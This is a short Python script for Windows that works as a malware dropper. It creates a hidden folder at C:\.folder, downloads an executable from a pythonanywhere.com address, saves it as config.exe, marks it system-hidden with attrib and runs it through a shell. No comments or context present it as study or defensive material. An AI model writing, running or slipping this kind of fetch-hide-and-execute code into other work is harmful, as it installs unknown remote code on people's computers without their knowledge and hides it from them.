import os 
import subprocess
import requests


def download_file(url, path):
    response = requests.get(url)
    with open(path, "wb") as file:
        file.write(response.content)


def make_invisible(path):
    subprocess.call(f'attrib +s +h "{path}"', shell=True)


def make_dir(dir_path):
    os.mkdir(dir_path)


def run_file(path):
    subprocess.call(f"start '{path}'", shell=True)


def configure():
    os.environ["COMSPEC"] = "C:\\Windows\\system32\\cmd.exe"


def main():
    configure()
    dir_path, file_path = "C:\\.folder", "C:\\.folder\\config.exe"
    url = "https://Christopher0101.pythonanywhere.com/download"

    make_dir(dir_path)
    make_invisible(dir_path)
    download_file(url, file_path)
    make_invisible(file_path)
    run_file(file_path)


if __name__ == "__main__":
    main()
